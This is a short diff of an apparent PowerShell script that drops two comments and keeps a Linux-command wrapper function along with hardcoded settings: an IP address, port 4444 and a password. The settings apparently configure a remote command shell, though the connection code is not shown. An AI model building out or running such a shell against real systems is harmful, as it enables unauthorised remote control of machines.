@@ -1,4 +1,3 @@
-# Linux shell wrapper for Windows - YOUR EXACT CODE + Linux commands
 function Invoke-LinuxCmd {
     param($cmd)
     switch -regex ($cmd) {
@@ -15,7 +14,6 @@ function Invoke-LinuxCmd {
     }
 }
 
-# --- YOUR EXACT ORIGINAL CODE ---
 $ip   = '172.16.176.40'
 $port = 4444
 $pass = 'biskviti'
